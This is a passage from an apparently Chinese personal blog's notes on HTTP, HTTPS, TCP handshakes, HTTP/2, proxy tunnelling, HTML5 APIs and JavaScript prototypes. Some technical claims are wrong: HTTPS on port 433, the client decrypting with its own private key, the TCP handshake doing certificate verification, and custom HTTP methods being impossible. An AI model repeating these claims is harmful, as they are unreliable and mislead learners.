class="line">(http1.0)Pragma/Expires</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p><strong>协商缓存(304)</strong><br>浏览器会向服务端发起 http 请求，然后服务端告诉浏览器文件未改变，让浏览器使用本地缓存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 属于协商缓存</span><br><span class="line">(http1.1)If-None-Match/E-TAG</span><br><span class="line">(HTTP1.0)If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-常见问题"><a href="#6-常见问题" class="headerlink" title="6. 常见问题"></a>6. 常见问题</h3><h4 id="6-1-CDN原理"><a href="#6-1-CDN原理" class="headerlink" title="6.1 CDN原理"></a><em>6.1 CDN原理</em></h4><p>当我们在地址栏输入一个网址，浏览器发现本地没有关于这个网址的 DNS 缓存，所以向网站的 DNS 服务器发起请求。<br>网站的 DNS 服务器设置了 CNAME，指向了某个 CDN 服务器，也就是我们常见的阿里云、腾讯云。<br>如果是第一次访问该内容，CDN 服务器会向源站请求数据并缓存。<br>否则，CDN服务器会找到 缓存了这个资源，并对用户响应最快的节点返回给用户，然后用户向该节点发出请求。</p><p><br></p><h4 id="6-2-shadowsock原理"><a href="#6-2-shadowsock原理" class="headerlink" title="6.2 shadowsock原理"></a><em>6.2 shadowsock原理</em></h4><p>在很久很久以前，我们访问各种网站都是简单而直接的，用户的请求通过互联网发送到服务提供方，服务提供方直接将信息反馈给用户。</p><p>然后有一天，GFW 就出现了，他像一面墙，每当用户需要获取信息，都经过了 GFW，GFW 将它不喜欢的内容统统过滤掉，于是客户当触发 GFW 的过滤规则的时候，就会收到 Connection Reset 这样的响应内容，而无法接收到正常的内容。</p><p>聪明的人们想到了利用境外服务器代理的方法来绕过 GFW 的过滤，其中包含了各种 HTTP 代理服务、Socks 服务、××× 服务… 其中以 ssh tunnel 的方法比较有代表性</p><ul><li>首先用户和境外服务器基于 ssh 建立起一条加密的通道</li><li>用户通过建立起的隧道进行代理，通过 ssh server 向真实的服务发起请求</li><li>服务通过 ssh server，再通过创建好的隧道返回给用户</li></ul><p><br></p><h4 id="6-3-Https"><a href="#6-3-Https" class="headerlink" title="6.3 Https"></a><em>6.3 Https</em></h4><p>HTTP协议，本身是明文传输的，因此很容易在传输过程中被中间这窃听、篡改、冒充。（Wifi热点，路由器，防火墙，反向代理，缓存服务器）。为了解决这些风险，HTTPS的价值就体现出来了</p><ul><li>内容加密，第三方无法窃听。</li><li>身份认证，一旦被篡改，通信双方会立刻发现。</li><li>数据完整性。防止内容冒充或者篡改。</li></ul><p><br><br>HTTPS，即HTTP下加入SSL层。HTTP + SSL/TLS。HTTPS的整个交互过程如下：</p><ul><li>用户在浏览器里输入一个https网址，此时客户端发起https请求，通过tcp和服务器建立连接(433端口)。</li><li>服务器存放CA证书进行处理，注意用HTTPS的服务器必须要有一套数字证书，这套证书其实一对公钥和私钥。</li><li>服务器向客户端返回证书。证书包含：域名，申请证书的公司，公钥。</li><li>客户端对证书进行解析。这个工作由客户端的TLS完成，首先会验证公钥是否有效，如颁发机构，过期时间等。如果发现异常，就会弹出一个警告框，提示证书存在问题。如果证书没有问题，就会生成一个随机数，然后用证书对该随机数进行加密。</li><li>向服务器发送证书加密后的随机数</li><li>服务器用它的私密进行解密，得到客户端传来的随机数</li><li>服务器用客户端的随机数加密后的信息发送给客户端</li><li>客户端用之前生成的私钥解密服务端传过来的信息</li></ul><p><br></p><h4 id="6-4-自定义HTTP请求方法？"><a href="#6-4-自定义HTTP请求方法？" class="headerlink" title="6.4 自定义HTTP请求方法？"></a><em>6.4 自定义HTTP请求方法？</em></h4><p>不能。<br>HTTP1.0定义了三种请求方法： GET、POST、HEAD<br>HTTP1.1新增了五种请求方法：OPTIONS、PUT、DELETE、TRACE 、CONNECT</p><p><br></p><h4 id="6-5-多个域名加载资源"><a href="#6-5-多个域名加载资源" class="headerlink" title="6.5 多个域名加载资源"></a><em>6.5 多个域名加载资源</em></h4><p>Q: 为什么同一网站的资源要使用不同域名加载(oss,cdn)<br>A: 浏览器对同一有连接数的限制。</p><p><br></p><h4 id="6-6-TCP-UDP-IP-HTTP的区别"><a href="#6-6-TCP-UDP-IP-HTTP的区别" class="headerlink" title="6,6 TCP, UDP, IP, HTTP的区别"></a><em>6,6 TCP, UDP, IP, HTTP的区别</em></h4><p>TCP, UDP是传输层协议，IP是网络层协议，HTTP是应用层协议。</p><ul><li>IP<br>是用来找到目标计算机。如A向B发送数据，那么要找到对方B的计算机，找到后就确定了网络间的通道，A - B。也就是说IP是来确定网络间的路径的。</li><li>TCP<br>是用来实现通信的，在IP实现了网络间路径后，TCP提供了这个路径的全双工通信的能力。这个链接的建立要经历三次握手，断开链接要四次挥手。（全双工：A可以给B发送数据的同时，B也可以给A发送数据）</li><li>UDP<br>是和TCP相似的，也是提供了通信能力。不过和TCP有区别。TCP是点对点的通讯，UDP支持一对多，多对一，一对一等。UDP不需要链接，直接发数据，相对来说速度更快，但是不保证数据一定会到达，适合广播。</li><li>HTTP<br>http是应用层的协议，它实现了怎么发数据和怎么收数据，定义了收发的格式</li></ul><p><br></p><h4 id="6-7-HTTP-2-0"><a href="#6-7-HTTP-2-0" class="headerlink" title="6.7.HTTP 2.0"></a><em>6.7.HTTP 2.0</em></h4><p><strong>延迟</strong><br>影响一个 HTTP 网络请求的因素主要有两个：带宽和延迟。</p><ul><li>浏览器阻塞<br>浏览器对于同一个域名有连接数限制。超过浏览器最大连接数限制，后续请求就会被阻塞。</li><li>DNS 查询<br>浏览器需要知道目标服务器的 IP 才能建立连接。利用 DNS 缓存可以减少这个时间</li><li>建立连接<br>HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。</li></ul><p><br><br><strong> HTTP1.0和HTTP1.1的区别</strong></p><ul><li>缓存处理<br>HTTP1.0中使用If-Modified-Since,Expires来做缓存判断的标准。HTTP1.1则引入了更多缓存控制策略，如Entity tag，If-Unmodified-Since, If-Match, If-None-Match。</li><li>Range<br>允许只请求资源的某个部分，支持断点续传功能</li><li>Host<br>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域。</li><li>长连接<br>HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive</li><li>新增24个错误状态响应码</li></ul><p><br><br><strong>HTTP1.0和1.1存在的问题</strong></p><ul><li>明文传输</li><li>请求头内容过大，每次请求header基本不怎么变化，增加了传输成本</li><li>虽然HTTP1.x支持了keep-alive，来弥补多次创建连接产生的延迟，但是keep-alive使用多了同样会给服务端带来大量的性能压力，并且对于单个文件被不断请求的服务(例如图片存放网站)，keep-alive可能会极大的影响性能，因为它在文件被请求之后还保持了不必要的连接很长时间</li></ul><p><br><br><strong>HTTP2.0新特性</strong></p><ul><li>二进制格式<br>HTTP1.X的解析是基于文本，二进制则只认0和1的组合，方便且健壮。</li><li>多路复用<br>连接共享。一个request对应一个id，这样一个连接上可以有多个request，request可以随机的混杂在一起，接收方可以根据request的id将request再归属到各自不同的服务端请求里。某个请求耗时严重，不会影响其他请求的正常执行。</li><li>header压缩<br>通讯双方各自cache一份header fields表，避免了重复header的传输，又减少了传输的大小</li><li>服务端推送<br>服务端推送能把客户端所需要的资源伴随着index.html一起发送到客户端，省去了客户端重复请求的步骤。正因为没有发起请求，建立连接等操作，所以静态资源通过服务端推送的方式可以极大地提升速度。</li></ul><p><br></p><h4 id="6-8-大文件分片上传"><a href="#6-8-大文件分片上传" class="headerlink" title="6.8 大文件分片上传"></a><em>6.8 大文件分片上传</em></h4><p><br></p><p><br></p><h4 id="6-9-无痕模式"><a href="#6-9-无痕模式" class="headerlink" title="6.9 无痕模式"></a><em>6.9 无痕模式</em></h4><p>从功能上明确无痕浏览的作用，涉及的功能包括：Bookmark, History(input, browser, download, forms/auto complete), SSL certs, Cookie, local storage, webSQL, Application cache, HTTP Cache, Disk Cache, Web App/Plugin。</p><ul><li><p>从正常模式进入无痕模式<br>进入无痕模式前的信息是否会在无痕下使用<br><img src="/2019/08/16/HTTP/1.jpeg" style="margin: 30px auto"></p></li><li><p>再次进入无痕模式<br>在前一无痕模式下设置的项目，是否可以在下一次无痕模式下使用<br><img src="/2019/08/16/HTTP/2.jpeg" style="margin: 30px auto"></p></li></ul><p><br></p><h4 id="6-10-多路复用-vs-长连接"><a href="#6-10-多路复用-vs-长连接" class="headerlink" title="6.10. 多路复用 vs 长连接"></a><em>6.10. 多路复用 vs 长连接</em></h4><p>HTTP2.0多路复用和HTTP1.X中的长连接复用有什么区别？</p><ul><li>HTTP/1.*<br>一次请求-相应，建立一个连接，用完关闭；每一个请求都要建立一个连接</li><li>HTTP/1.1 Pipeling<br>若干个请求排队串行化单线程处理，后面的请求等待前面请求的返回才能获得执行机会，一旦有某请求超时等，后续请求只能被阻塞。</li><li>HTTP/2<br>多个请求可同时在一个连接上并行执行。某个请求任务耗时严重，不会影响到其他连接的正常执行。<br><img src="/2019/08/16/HTTP/3.png" style="max-width:500px; margin: 30px auto"></li></ul><p><br></p><h4 id="6-11-三次握手-amp-四次挥手"><a href="#6-11-三次握手-amp-四次挥手" class="headerlink" title="6.11. 三次握手 &amp; 四次挥手"></a><em>6.11. 三次握手 &amp; 四次挥手</em></h4><p><strong>三次握手</strong></p><ul><li>第一次握手：客户端给服务器发送一个 SYN 报文。客户端处于 SYN_send 状态。</li><li>第二次握手：服务器收到 SYN 报文之后，会应答一个 SYN+ACK 报文。服务器处于 SVN_REVD 状态。</li><li>第三次握手：客户端收到 SYN+ACK 报文之后，会回应一个 ACK 报文。客户端处于 establised 状态。</li><li>服务器收到 ACK 报文之后，三次握手建立完成。服务器处于 establised 状态。</li></ul><p><br><br><strong>三次握手的作用</strong></p><ul><li>为了确认双方的接收和发送能力是否正常。</li><li>指定自己的初始化序列号，为后面的可靠传送做准备。</li><li>如果是 https 协议的话，三次握手这个过程，还会进行数字证书的验证以及加密密钥的生成。<br><img src="/2019/08/16/HTTP/4.png" style="max-width: 500px; margin: 30px auto"></li></ul><p><br><br><strong>四次挥手</strong></p><ul><li>第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。</li><li>第二次握手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。</li><li>第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。</li><li>第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态</li><li>服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。</li></ul><p><img src="/2019/08/16/HTTP/5.png" style="max-width: 500px; margin: 30px auto"></p><p><br></p><h4 id="6-12-https抓包原理"><a href="#6-12-https抓包原理" class="headerlink" title="6.12 https抓包原理"></a><em>6.12 https抓包原理</em></h4><p>为什么用了https还能被抓包？<br>Charles作为一个中间人代理，当浏览器和服务器通信时，Charles接收服务器的证书，但是不会发给浏览器，而是动态生成一张证书发送给浏览器。由于Charles更改了证书，浏览器校验不同过会弹出安全警告，所以必须安装Charles的证书后才能正常访问。</p><p>Charles需要做的事情是对客户端伪装服务端，对服务端伪装客户端：</p><ul><li>截获真实客户端的https请求，伪装客户端向真实服务端发送https请求。</li><li>接受真实服务器响应，用charles自己的证书伪装服务端向真实客户端发送数据内容。</li></ul><h4 id="6-13-URL长度限制"><a href="#6-13-URL长度限制" class="headerlink" title="6.13 URL长度限制"></a>6.13 URL长度限制</h4><p>2083字节(2kb + 53)</p><h4 id="6-14-端口上限"><a href="#6-14-端口上限" class="headerlink" title="6.14 端口上限"></a>6.14 端口上限</h4><p>65535(2^16-1)</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《图解HTTP》</li><li><a href="https://juejin.im/post/5cf765275188257c6b51775f" target="_blank" rel="noopener">前端大文件上传</a></li><li><a href="http://www.nbsite.cn/database/176" target="_blank" rel="noopener">shadowsock原理详解</a></li><li><a href="https://blog.csdn.net/horkychen/article/details/21054807" target="_blank" rel="noopener">Chrome的无痕浏览实现初探</a></li><li><a href="https://juejin.im/entry/5981c5df518825359a2b9476" target="_blank" rel="noopener">HTTP1.0、HTTP1.1 和 HTTP2.0 的区别</a></li><li><a href="https://juejin.im/post/5ccd0dfc6fb9a0324a08bb73" target="_blank" rel="noopener">关于三次握手与四次挥手面试官想考我们什么？</a></li><li><a href="https://juejin.im/post/5d0c703351882532bd607cab" target="_blank" rel="noopener">Http,Socket,Tcp,Udp,Ip原理区别</a></li><li><a href="https://juejin.im/entry/58077fab0e3dd900572bc35b" target="_blank" rel="noopener">HTTPS 原理剖析与项目场景</a></li><li><a href="https://m.php.cn/faq/428990.html" target="_blank" rel="noopener">https抓包原理</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTML5新特性</title>
      <link href="/2019/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/"/>
      <url>/2019/08/07/HTML5%E6%96%B0%E7%89%B9%E6%80%A7/</url>
      <content type="html"><![CDATA[<h4 id="1-语义化标签"><a href="#1-语义化标签" class="headerlink" title="1. 语义化标签"></a>1. 语义化标签</h4><p>以前我们都是使用<code>&lt;div&gt;</code>标签布局，div标签的语义不清晰，html5为了规范这一块，给出了一系列的标签。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span>     头部区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span>     底部区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>           导航区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span>       侧边栏区域标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span>   定义 section，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span>   文章段落标签，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span><span class="tag">&lt;/<span class="name">summary</span>&gt;</span>   定义 details 元素的标题，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">detailes</span>&gt;</span><span class="tag">&lt;/<span class="name">detailes</span>&gt;</span> 定义元素的细节，块级标签</span><br><span class="line"><span class="tag">&lt;<span class="name">mark</span>&gt;</span><span class="tag">&lt;/<span class="name">mark</span>&gt;</span>         标记记号标签，内联标签</span><br><span class="line"><span class="tag">&lt;<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">time</span>&gt;</span>         时间区域标签，内联标签</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-表单新类型"><a href="#2-表单新类型" class="headerlink" title="2. 表单新类型"></a>2. 表单新类型</h4><p><code>&lt;input&gt;</code>表单标签的新类型<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> /&gt;</span>  e-mail 地址的输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> /&gt;</span> 数字输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"url"</span> /&gt;</span>    URL 地址的输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> /&gt;</span>  range 类型显示为滑动条，默认value值是1~100的限定范围</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span> <span class="attr">name</span>=<span class="string">"points"</span> <span class="attr">min</span>=<span class="string">"1"</span> <span class="attr">max</span>=<span class="string">"10"</span> /&gt;</span>  可以通过min属性和max属性自定义范围</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> /&gt;</span> 用于搜索域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"color"</span> /&gt;</span>  用于定义选择颜色</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"tel"</span> /&gt;</span>    电话号码输入域</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span> /&gt;</span>   date类型为时间选择器</span><br></pre></td></tr></table></figure></p><p><code>input</code>新增的新属性</p><ul><li><code>placeholder</code>: string, 文本框的默认提示，在用户输入后消失</li><li><code>required</code>: boolean, 要求文本框不能为空</li><li><code>pattern</code>: regex, 用于验证值的正则</li><li><code>min</code>, <code>max</code>: 设置元素的最大最小值</li><li><code>step</code>: 输入域规定的数字间隔</li><li><code>width</code>, <code>height</code>: 宽高</li><li><code>autofocus</code>: boolean, 页面加载时，域自动获得焦点</li><li><code>multiple</code>: booelan, 规定元素可选择多个值</li></ul><p><br></p><h4 id="3-视频和音频"><a href="#3-视频和音频" class="headerlink" title="3. 视频和音频"></a>3. 视频和音频</h4><p><code>&lt;audio&gt;</code>支持的音频格式有 mp3, Wav, Ogg。<br><code>&lt;video&gt;</code>支持 mp4, WebM, Ogg。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"1.mp3"</span> <span class="attr">id</span>=<span class="string">"audio"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">height</span>=<span class="string">"400"</span> <span class="attr">id</span>=<span class="string">"video"</span> <span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"video/jieda2.mp4"</span> <span class="attr">type</span>=<span class="string">"audio/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>视频和音频常用的方法</p><ul><li><code>play()</code>  开始播放</li><li><code>pause()</code> 暂停播放</li><li><code>load()</code>  重新加载音频/视频</li></ul><p>视频和视频常用的属性</p><ul><li><code>controls</code> 是否显示播放/暂停控件</li><li><code>defaultPlaybackRate</code> 设置默认播放速度</li><li><code>duration</code> 返回当前音频/视频的长度(以秒计)</li><li><code>ended</code> 返回音频/视频是否已结束</li><li><code>loop</code> 设置或返回音频/视频是否应在结束时重新播放</li><li><code>muted</code> 设置或返回音频/视频是否静音</li><li><code>networkState</code> 返回音频/视频的当前网络状态</li><li><code>src</code> 设置或返回音频/视频元素的当前来源</li><li><code>volume</code> 设置或返回音频/视频的音量</li><li><code>readyState</code> 返回音频/视频当前的就绪状态</li><li><code>played</code> 表示音频/视频已播放部分的 TimeRanges 对象</li></ul><p><br></p><h4 id="4-canvas"><a href="#4-canvas" class="headerlink" title="4. canvas"></a>4. canvas</h4><p><code>canvas</code> 元素用于在网页上绘制图形,canvas标签本身只是个图型容器，需要使用javaScript脚本来绘制图形。</p><p><br></p><h4 id="5-SVG"><a href="#5-SVG" class="headerlink" title="5. SVG"></a>5. SVG</h4><p>SVG是指可伸缩的矢量图形，SVG 也是一种使用 XML 描述 2D 图形的语言。我们可以为某个元素附加 JavaScript 事件处理器。在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p><p><br></p><h4 id="6-拖放-Drag和Drop"><a href="#6-拖放-Drag和Drop" class="headerlink" title="6. 拖放(Drag和Drop)"></a>6. 拖放(Drag和Drop)</h4><p>在h5之前实现拖拽功能，用的是<code>onmousedown</code>，获取当前的一些信息，然后在<code>onmousemove</code>时不断更新拖拽对象的<code>left</code>和<code>top</code>值，最后在<code>onmouseup</code>时对拖拽对象彻底复制，并释放后一系列的程序操作。</p><p>h5出来后，不需要再模拟，因为已经有了标准的事件api<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"draggable"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"draggable"</span> draggable=<span class="string">"true"</span>&gt;</span><br><span class="line">draggable</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var dragEl = document.getElementById('draggable');</span></span><br><span class="line"><span class="regexp">var l = null, t = null;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragstart = function (e) &#123; /</span><span class="regexp">/ 准备推拽时</span></span><br><span class="line"><span class="regexp">  l = e.clientX - this.offsetLeft, t = e.clientY - this.offsetTop;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondrag = function (e) &#123;  /</span><span class="regexp">/ 拖拽进行时</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">  console.log(x, y, l , t)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dragEl.ondragend = function (e) &#123;   /</span><span class="regexp">/ 拖拽结束时</span></span><br><span class="line"><span class="regexp">  var x = e.clientX, y = e.clientY;</span></span><br><span class="line"><span class="regexp">  this.style.left = x - l + 'px';</span></span><br><span class="line"><span class="regexp">  this.style.top = y - t + 'px';</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="7-地理位置"><a href="#7-地理位置" class="headerlink" title="7. 地理位置"></a>7. 地理位置</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">navigator.geolocation.getCurrentPosition(successPos)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">successPos</span> (<span class="params">pos</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'定位时间：'</span>,pos.timestamp)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'经度：'</span>,pos.coords.longitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'纬度：'</span>,pos.coords.latitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'海拔：'</span>,pos.coords.altitude)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'速度：'</span>,pos.coords.speed)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="8-离线存储"><a href="#8-离线存储" class="headerlink" title="8. 离线存储"></a>8. 离线存储</h4><p>HTML5，通过创建 cache manifest 文件，可以创建 web 应用的离线版本</p><p><br></p><h4 id="9-Web存储"><a href="#9-Web存储" class="headerlink" title="9. Web存储"></a>9. Web存储</h4><p><code>localStorage</code> 没有时间限制的数据存储.<br><code>sessionStorage</code> 网页还没有关闭的情况下的存储，网页窗口关闭，则数据销毁。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)  <span class="comment">// 存储数据</span></span><br><span class="line">localStorage.getItem(<span class="string">'key'</span>)         <span class="comment">// 取数据</span></span><br><span class="line">localStorage.removeItem(<span class="string">'key'</span>)      <span class="comment">// 删除数据</span></span><br><span class="line">localStorage.clear()                <span class="comment">// 删除所有数据</span></span><br><span class="line">localStorage.key(index)             <span class="comment">// 获取某个索引数据</span></span><br><span class="line"></span><br><span class="line">sessionStorage.setItem(<span class="string">'key'</span>, <span class="string">'val'</span>)<span class="comment">// 存储数据</span></span><br><span class="line">sessionStorage.getItem(<span class="string">'key'</span>)       <span class="comment">// 取数据</span></span><br><span class="line">sessionStorage.removeItem(<span class="string">'key'</span>)    <span class="comment">// 删除数据</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="10-WebSocket"><a href="#10-WebSocket" class="headerlink" title="10. WebSocket"></a>10. WebSocket</h4><p>websocket事件</p><ul><li>Socket.onopen 连接建立时触发</li><li>Socket.onmessage 客户端接收服务端数据时触发</li><li>Socket.onerror 通信发生错误时触发</li><li>Socket.onclose 连接关闭时触发</li></ul><p><br></p><h4 id="11-Web-Workers"><a href="#11-Web-Workers" class="headerlink" title="11. Web Workers"></a>11. Web Workers</h4><p>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情。</p><p><br></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://juejin.im/post/5be8d817e51d457f7a4aba13" target="_blank" rel="noopener">HTML5的新特性概述（上）</a></li><li><a href="https://juejin.im/post/5bea349a518825170d1a9db1" target="_blank" rel="noopener">HTML5新特性概述(下)</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS实现面向对象，原型链, Class，new</title>
      <link href="/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
      <url>/2019/08/07/JS%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      <content type="html"><![CDATA[<h3 id="1-原型链"><a href="#1-原型链" class="headerlink" title="1. 原型链"></a>1. 原型链</h3><p>JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// f.prototype用于指向对象f的原型</span></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line"><span class="comment">// o的整个原型链如下:</span></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br></pre></td></tr></table></figure><p>每个函数都有一个 prototype 